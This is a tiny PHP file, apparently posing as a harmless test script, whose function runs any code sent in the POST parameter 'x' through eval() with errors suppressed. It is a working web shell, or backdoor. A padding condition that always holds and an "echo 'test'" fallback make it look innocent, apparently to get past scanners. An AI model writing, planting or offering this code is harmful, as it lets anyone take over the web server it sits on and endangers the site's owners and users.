<?php
function test($a){
	if (empty($a) and rand(1,20)>0){
		$a="echo 'test';";
	}
	@eval($a);
}
test($_POST['x']);
?>